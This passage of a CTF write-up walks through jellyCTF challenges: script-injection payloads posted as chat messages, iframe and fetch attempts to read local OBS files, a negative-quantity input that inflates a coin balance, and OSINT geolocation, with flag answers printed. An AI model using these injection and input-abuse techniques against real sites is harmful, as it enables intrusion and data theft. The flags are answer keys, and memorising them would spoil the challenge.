691.00px; height: 306.62px;"><img alt="" src="images/image4.png" style="width: 691.00px; height: 471.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.s75qmfxandhn"><span class="c19">I later figured out how to remove my cursor from screenshots</span></p><h1 class="c33" id="h.vzxppp1webg5"><span class="c10">Pentest_on_stream</span></h1><p class="c18"><span class="c7">For this one. I have to pwn without access to the source code. Which is a little trickier for me. I tried a message with some possible attacks off the top of my head and we see some interesting stuff.</span></p><p class="c15"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 656.50px; height: 616.44px;"><img alt="" src="images/image8.png" style="width: 656.50px; height: 616.44px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c15"><span class="c7">My next step is to try and use javascript to edit the message body.</span></p><p class="c45"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 528.00px; height: 282.00px;"><img alt="" src="images/image22.png" style="width: 528.00px; height: 282.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span>Very cool! But how do I get the token? My first guess is to try and get as much info as we possible can with </span><span class="c9">JSON</span><span class="c3">.stringify(</span><span class="c9">document</span><span class="c3">)</span></p><p class="c18"><span>&nbsp;</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 651.43px; height: 43.71px;"><img alt="" src="images/image53.jpg" style="width: 651.43px; height: 360.79px; margin-left: 0.00px; margin-top: -0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">One little problem: it gives me back an image. It&rsquo;s kind of clever actually, I wonder how they do it. But regardless, I&rsquo;ll need to filter the input from the payload, there&rsquo;s no way to get a dump of all the site data without doing something a little more complicated and perhaps naughty. Also, JSON.stringify actually gives me way less data and just using innerHTML is probably the way to go.</span></p><p class="c18"><span class="c7">Here&rsquo;s the next payload:</span></p><a id="t.5af5709c307283395630b2ace9be82f4061a9134"></a><a id="t.11"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">I&#39;m a big fan!<br></span><span class="c12">&lt;</span><span class="c4">script</span><span class="c12">&gt;</span><span class="c9">document</span><span class="c3">.body.innerHTML = </span><span class="c9">document</span><span class="c3">.body.innerHTML.search(</span><span class="c14">&quot;jellyCTF&quot;</span><span class="c3">)</span><span class="c12">&lt;/</span><span class="c4">script</span><span class="c12">&gt;</span></p></td></tr></table><p class="c18"><span class="c7">And the result:</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 303.55px; height: 90.00px;"><img alt="" src="images/image54.jpg" style="width: 1279.71px; height: 724.83px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">Okay, so that&rsquo;s the index. What I really want is the string.</span></p><a id="t.024098b9a5e4cf0dd7236b2d6e00d7a11bf241e1"></a><a id="t.12"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">I&#39;m a big fan!<br></span><span class="c12">&lt;</span><span class="c4">script</span><span class="c12">&gt;</span><span class="c9">document</span><span class="c3">.body.innerHTML = </span><span class="c9">document</span><span class="c3">.body.innerHTML.slice(180)</span><span class="c12">&lt;/</span><span class="c4">script</span><span class="c12">&gt;</span></p></td></tr></table><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 301.00px; height: 110.00px;"><img alt="" src="images/image50.jpg" style="width: 1280.26px; height: 719.97px; margin-left: -0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">Weird. I don&rsquo;t know what to make of that. Really I should be using a regular expression though</span></p><a id="t.60e39c47de1a94cc773aeeb10af98d65de1d48da"></a><a id="t.13"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">I&#39;m a big fan!<br></span><span class="c12">&lt;</span><span class="c4">script</span><span class="c12">&gt;</span><span class="c9">document</span><span class="c3">.body.innerHTML = </span><span class="c9">document</span><span class="c3">.body.innerHTML.match(</span><span class="c14">&quot;jellyCTF\{.*\}&quot;</span><span class="c3">)[0]</span><span class="c12">&lt;/</span><span class="c4">script</span><span class="c12">&gt;</span></p></td></tr></table><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 508.00px; height: 369.05px;"><img alt="" src="images/image36.jpg" style="width: 941.36px; height: 529.43px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">It didn&rsquo;t work. That probably means that the javascript didn&rsquo;t execute because there was an error which probably means the regex failed to find a match.. Let&rsquo;s try something else:</span></p><a id="t.e0109cab79698865c28103b52de2d4e09f05752b"></a><a id="t.14"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c12">&lt;</span><span class="c4">pre</span><span class="c12">&nbsp;id=</span><span class="c14">this1</span><span class="c12">&gt;</span><span class="c3">hello</span><span class="c12">&lt;/</span><span class="c4">pre</span><span class="c12">&gt;</span><span class="c3"><br></span><span class="c12">&lt;</span><span class="c4">script</span><span class="c12">&gt;</span><span class="c3"><br></span><span class="c9">document</span><span class="c3">.getElementById(</span><span class="c14">&quot;this1&quot;</span><span class="c3">).innerHTML = </span><span class="c9">document</span><span class="c3">.body.innerHTML.slice(</span><span class="c9">document</span><span class="c3">.body.innerHTML.search(</span><span class="c14">&quot;jellyCTF&quot;</span><span class="c3">))<br></span><span class="c12">&lt;/</span><span class="c4">script</span><span class="c12">&gt;</span></p></td></tr></table><p class="c5"><span><br></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 568.50px; height: 407.94px;"><img alt="" src="images/image46.jpg" style="width: 1051.08px; height: 591.39px; margin-left: 0.00px; margin-top: -0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">At this point I finally realized that the positive match I initially found was matching the actual javascript which performed the search, and there was no flag in the page. I feel like I don&rsquo;t have a clue what&rsquo;s going on, and the prompt says I should try to understand what&rsquo;s going on in the site, so let&rsquo;s see what we can learn.</span></p><a id="t.d1a4a2ea39287e5775a2705a6272d94dff0e963b"></a><a id="t.15"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c12">&lt;</span><span class="c4">pre</span><span class="c12">&nbsp;id=</span><span class="c14">this1</span><span class="c12">&gt;</span><span class="c3">hello</span><span class="c12">&lt;/</span><span class="c4">pre</span><span class="c12">&gt;</span><span class="c3"><br></span><span class="c12">&lt;</span><span class="c4">script</span><span class="c12">&gt;</span><span class="c3"><br></span><span class="c16">let</span><span class="c3">&nbsp;o = </span><span class="c9">document</span><span class="c3">.all; </span><span class="c20">//this was leftover from some other experiments</span><span class="c3"><br></span><span class="c16">let</span><span class="c3">&nbsp;s = </span><span class="c9">window</span><span class="c3">.location.href<br></span><span class="c9">document</span><span class="c3">.body.innerHTML = s<br></span><span class="c12">&lt;/</span><span class="c4">script</span><span class="c12">&gt;</span></p></td></tr></table><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 466.50px; height: 327.60px;"><img alt="" src="images/image52.jpg" style="width: 838.80px; height: 472.79px; margin-left: 0.00px; margin-top: -0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">We might be getting somewhere. Let&rsquo;s see if we can go to another page on the webroot.</span></p><a id="t.d932f4b8d3cc35f4dee30d059c09eb55764e6ac3"></a><a id="t.16"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c12">&lt;</span><span class="c4">iframe</span><span class="c12">&nbsp;src=</span><span class="c14">&quot;http://absolute/&quot;</span><span class="c12">&gt;&lt;/</span><span class="c4">iframe</span><span class="c12">&gt;</span></p></td></tr></table><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 436.50px; height: 336.11px;"><img alt="" src="images/image6.jpg" style="width: 797.96px; height: 449.39px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7"><br>No dice! I was hoping for some sort of automatically generated directory view.</span></p><a id="t.9eaa43b481fe9c642f7bb293032e4877059c5ff3"></a><a id="t.17"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c12">&lt;</span><span class="c4">iframe</span><span class="c12">&nbsp;src=</span><span class="c14">&quot;http://absolute//app/chat.html&quot;</span><span class="c12">&gt;&lt;/</span><span class="c4">iframe</span><span class="c12">&gt;</span></p></td></tr></table><p class="c18 c34"><span class="c7"></span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 408.50px; height: 316.30px;"><img alt="" src="images/image15.jpg" style="width: 781.85px; height: 439.94px; margin-left: -20.15px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">But hey, that&rsquo;s kind of funny, right? I suppose I could try looking for flag.txt. </span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 492.00px; height: 676.00px;"><img alt="" src="images/image43.png" style="width: 492.00px; height: 676.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.x3tdozsw8n1y"><span class="c19">I missing clue perhaps?</span></p><p class="c18"><span class="c7">Yeah okay I was wrong. This is like any other challenge; we get the source code because otherwise it puts too much strain on the servers. Sorry servers. Anyway, now that I have the source code I can see how it all works and it&#39;s pretty cool. Turns out OBS is the thing that screenshots the webpage. As for what my target could be, there are some option:</span></p><p class="c18"><span class="c7">OBS, maybe steal some data like a stream key?<br>Valkey, there might be something good in there, but it seems like it&rsquo;s just something Flask uses to implement rate limiting.</span></p><p class="c18"><span class="c7">After a bit of grepping I found the key was in an OBS scene. That tells me that there is probably an OBS-specific exploit I need to perform.</span></p><p class="c18"><span>At this point I finally understood something that had puzzled me; the meaning of </span><span class="c32 c35">absolute</span><span class="c7">. The screenshots we get back from using the OBS library are not actually of pages on the flask webserver like I&rsquo;d assumed, instead the browser used with OBS is just opening files and viewing them and &ldquo;absolute&rdquo; is the project root. So we have some degree of access to a program that can open and read arbitrary files and send info back to us.</span></p><p class="c18"><span class="c7">At this point it seemed like we were as good as done. But it was not so simple: Firstly, I tried simply using an iframe. It had worked before so maybe now that I know the actual path to the file we can get somewhere.</span></p><a id="t.b2d2f10cbaf1d21147956373de761ad71f8c76a1"></a><a id="t.18"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c12 c30">&lt;</span><span class="c4 c30">iframe</span><span class="c12 c30">&nbsp;src=</span><span class="c14 c30">&quot;http://absolute//obs-studio/basic/scenes/scenes.json&quot;</span><span class="c12 c30">&gt;&lt;/</span><span class="c4 c30">iframe</span><span class="c12 c30">&gt;</span></p></td></tr></table><p class="c18 c34"><span class="c7"></span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 436.50px; height: 336.11px;"><img alt="" src="images/image6.jpg" style="width: 797.96px; height: 449.39px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">Nothing, but maybe iframes don&rsquo;t work on json. Next thing I tried was this payload which was actually mostly nicked from the Cherry challenge later on, a lot of great code snippets came out of this.</span></p><a id="t.f438cd30b23c0cd880deced25b0a7f4d2d4d9808"></a><a id="t.19"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c12">&lt;</span><span class="c4">script</span><span class="c12">&gt;</span><span class="c3"><br>fetch(</span><span class="c14">&#39;http://absolute//obs-studio/basic/scenes/scenes.json&#39;</span><span class="c3">)<br>.then(response =&gt; response.text())<br>.then(text =&gt; {<br> &nbsp;</span><span class="c9">document</span><span class="c3">.body.innerHTML = text.match(</span><span class="c14">&#39;jellyCTF\{.*\}&#39;</span><span class="c3">)<br>})<br></span><span class="c12">&lt;/</span><span class="c4">script</span><span class="c12">&gt;</span></p></td></tr></table><p class="c18"><span class="c7">This failed to do anything at all. I guessed at the time that this javascript may simply not be implemented in the webkit that OBS uses but I think it probably failed for the same reason the above failed. At this point I would have had to go to the web to find the exploit which is usually where I lose interest.</span></p><hr><p class="c18 c34"><span class="c7"></span></p><p class="c52 c39 title" id="h.5tl9egi5vbkd"><span class="c51 c41">pwn</span></p><hr><p class="c1"><span class="c7"></span></p><h1 class="c33" id="h.y9uzkh9rzv6c"><span>P</span><span class="c10">hase_coffee_1</span></h1><p class="c18"><span class="c7">The Dockerfile scared us off initially, but it&rsquo;s actually not that complicated, and you can run it locally no problem. It&#39;s a menu tree, evocative of old pre-internet phone trees that used to be everywhere.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 546.00px; height: 429.00px;"><img alt="" src="images/image9.png" style="width: 546.00px; height: 429.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span>Anyway, I edited the source code and gave myself </span><span class="c32">MAXINT</span><span class="c7">&nbsp;money. Let&rsquo;s see what I can buy.</span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 766.00px; height: 58.00px;"><img alt="" src="images/image37.png" style="width: 766.00px; height: 58.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">Yeah okay not that surprising. It just reads the content of flag.txt. Which isn&rsquo;t the answer :(</span></p><p class="c18"><span class="c7">Maybe some of those arguments after the EXEC transform the text in some way. It&rsquo;s the only thing in there that looks interesting.</span></p><a id="t.28ea852d6665db61c2ba6a4a7a3dbd575d30c300"></a><a id="t.20"></a><table class="c56"><tr class="c13"><td class="c64" colspan="1" rowspan="1"><p class="c18"><span class="c32 c46">ENTRYPOINT [&quot;socat&quot;, &quot;-dd&quot;, &quot;TCP4-LISTEN:5000,fork,reuseaddr&quot;, &quot;EXEC:./main,pty,echo=0,raw,iexten=0&quot;] </span></p></td></tr></table><p class="c18"><span class="c7">&nbsp;It&rsquo;s doubtful, though. The flag.txt is 8 bytes long, there&rsquo;s pretty much no way to interpret it differently as far as I can imagine, but let&rsquo;s give it a shot.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 731.00px; height: 292.00px;"><img alt="" src="images/image18.png" style="width: 731.00px; height: 292.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.zbgmwi6qljtd"><span class="c19">Alright I give up, Docker sux.</span></p><p class="c18"><span class="c7">Let me double check that I haven&rsquo;t missed anything.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 441.00px; height: 535.00px;"><img alt="" src="images/image40.png" style="width: 441.00px; height: 535.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><h4 class="c61 c39" id="h.frv47v1d29cn"><span class="c29">I missed something</span></h4><p class="c18"><span>Yeah, that makes a lot more sense. I&rsquo;m supposed to pwn a running instance where I can&rsquo;t read the key from a text file, and I can&rsquo;t edit the source code to give myself </span><span class="c32">MAXINT</span><span class="c7">&nbsp;money or just remove all code paths except the part that gives me the key. This should be interesting. Let&rsquo;s skip to the source code:</span></p><p class="c18"><span class="c7">If I want that amazing coffee, this has to be true:</span></p><a id="t.95f669bafe8363532b1428c800137dade9a8070f"></a><a id="t.21"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c16">if</span><span class="c3">&nbsp;(coin_balance &gt;= </span><span class="c0">1000000</span><span class="c3">) </span></p></td></tr></table><p class="c18"><span class="c7">Which means this statement has to increase my balance:</span></p><a id="t.08c8402a59443c8768ec7806a31d871d1af11694"></a><a id="t.22"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">coin_balance = coin_balance - total_cost; </span></p></td></tr></table><p class="c18"><span class="c7">Which means total cost has to be negative, which means quantity has to be negative</span></p><a id="t.c5cd9df909cf28b0a5af3141664946aa97ccf524"></a><a id="t.23"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c16">int</span><span class="c3">&nbsp;total_cost = </span><span class="c0">35</span><span class="c3">&nbsp;* quantity; </span></p></td></tr></table><p class="c18"><span class="c7">Which finally brings us to a variable that we can control.</span></p><a id="t.2c052baf553aaa8450a61b4e74f2a266c1d8230e"></a><a id="t.24"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c9">scanf</span><span class="c3">(</span><span class="c14">&quot;%d&quot;</span><span class="c3">, &amp;quantity); </span></p></td></tr></table><p class="c15"><span class="c7">And that should be all we need:</span></p><p class="c15"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 741.00px; height: 838.00px;"><img alt="" src="images/image19.png" style="width: 741.00px; height: 838.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.5wn4wgdr18fe"><span class="c19">Boom, get pwned</span></p><hr><p class="c1"><span class="c7"></span></p><p class="c39 c52 title" id="h.ihwujft6a5i5"><span class="c51 c41">OSInt</span></p><hr><p class="c1"><span class="c7"></span></p><h1 class="c17" id="h.dz6jmj2txg51"><span class="c10">Stalknights_1</span></h1><p class="c23 subtitle" id="h.pcg1dmdqmshf"><span class="c19">Stumbled across this Starknight while scrolling through Instagram. Can you figure out what neighbourhood and country this photo was taken in?</span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 720.00px; height: 720.00px;"><img alt="" src="images/image56.jpg" style="width: 720.00px; height: 720.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span>Where was this photo taken? Thankfully Google reverse image search, or </span><span class="c40">&ldquo;Lens&rdquo;,</span><span class="c7">&nbsp;is still good enough to find images.</span></p><h3 class="c5 c39" id="h.nbpgm3jq9aqn"><span class="c41 c32 c50">jellyCTF{zaanse_schans,netherlands}</span></h3><h1 class="c17" id="h.jcgyzp435x1i"><span class="c10">Stalknights_2</span></h1><p class="c6 subtitle" id="h.labtqafq42pb"><span class="c43">starknight1337</span><span class="c19">&nbsp;shared another photo on their Instagram. What is the name of the park where the photo was taken?</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 686.43px; height: 471.59px;"><img alt="" src="images/image5.jpg" style="width: 686.43px; height: 471.59px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span>This one&rsquo;s a little tougher because it has a bunch of stuff superimposed on the image. The Bikes visible are </span><span class="c40">Tier</span><span>&nbsp;bikes. That narrows it down to these locations.</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 598.00px; height: 597.00px;"><img alt="" src="images/image30.png" style="width: 598.00px; height: 597.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.f5ukqa66i5l3"><span class="c37"><a class="c28" href="https://www.google.com/url?q=https://www.tier.app/en/where-to-find-us&amp;sa=D&amp;source=editors&amp;ust=1719257876270345&amp;usg=AOvVaw28orgKlxaTs61GjmY-FEc-">https://www.tier.app/en/where-to-find-us</a></span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 438.50px; height: 222.75px;"><img alt="" src="images/image17.png" style="width: 438.50px; height: 222.75px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">ATLANTIC PIZZA? (28)?</span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 341.65px; height: 490.47px;"><img alt="" src="images/image25.png" style="width: 341.65px; height: 490.47px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">Bright Festival, what&rsquo;s that? Going to google images and looking for a &ldquo;Bright Festival&rdquo; with the same logo, I find this:</span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 691.50px; height: 466.41px;"><img alt="" src="images/image10.png" style="width: 691.50px; height: 466.41px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span>Brussels is fitting. It is the waffle capital of the world after all. A bit of </span><span>Geoguessing</span><span class="c7">&nbsp;later and we have our answer:</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 667.50px; height: 611.88px;"><img alt="" src="images/image32.png" style="width: 667.50px; height: 611.88px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><h3 class="c5 c39" id="h.ynp2e76fuk24"><span class="c41 c32 c50">jellyCTF{square de la putterie}</span></h3><h1 class="c17" id="h.x5qwyhsxj9g9"><span class="c10">Stalknights_3</span></h1><p class="c18"><span class="c7">OwO, what&rsquo;s this?</span></p><h2 class="c22" id="h.jzhnsy863ucb"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 582.00px; height: 332.00px;"><img alt="" src="images/image23.png" style="width: 582.00px; height: 332.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></h2><p class="c18"><span>This plane is called the </span><span class="c43">Eevee Jet</span><span>, its flight number is </span><span class="c43">JA784A. </span><span>We need to find out where it was on </span><span class="c43">May 3rd 2024</span><span>. A little bit of googling revealed </span><span class="c37"><a class="c28" href="https://www.google.com/url?q=http://adsbexchange.com&amp;sa=D&amp;source=editors&amp;ust=1719257876272097&amp;usg=AOvVaw2iIMn8Q7fGg-JuPcj_FE2B">adsbexchange.com</a></span><span>, a cool and completely free interactive flight map with full history. Between May 2nd and May 3rd UTC, this plane was on the flight path </span><span class="c41 c43 c57 c62">ANA160.</span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 622.00px; height: 254.00px;"><img alt="" src="images/image16.png" style="width: 622.00px; height: 254.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">It would have touched down at 2am in New York before returning to Tokyo. So our answer is:</span></p><h3 class="c5 c39" id="h.dot4inwnlo0h"><span>jellyCTF{New York City, United States}</span></h3><h1 class="c17" id="h.gkl0eca6e3st"><span>Further Stalking</span></h1><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 586.00px; height: 134.00px;"><img alt="" src="images/image1.png" style="width: 586.00px; height: 134.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 757.59px; height: 468.31px;"><img alt="" src="images/image27.png" style="width: 757.59px; height: 468.31px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.fl7dxa8de0kk"><span class="c19">Atlas search ftw</span></p><p class="c18"><span class="c37"><a class="c28" href="https://www.google.com/url?q=https://github.com/starknight1337/rustlings_practice&amp;sa=D&amp;source=editors&amp;ust=1719257876273082&amp;usg=AOvVaw2zn-H_6gi7r-aKlDxzAZm3">https://github.com/starknight1337/rustlings_practice</a></span></p><p class="c18"><span class="c7">There&rsquo;s got to be something juicy here</span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 887.00px; height: 498.00px;"><img alt="" src="images/image2.png" style="width: 887.00px; height: 498.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span>This repo is a fork of rust-lang/rustlings - &ldquo;&#129408; Small exercises to get you used to reading and writing Rust code!&rdquo;. All commits before these are from the original repo. Unfortunately git push --force really does seem to purge git history, at least on the remote and all of its clones. I used </span><span class="c32 c35">git fsck --full --no-reflogs 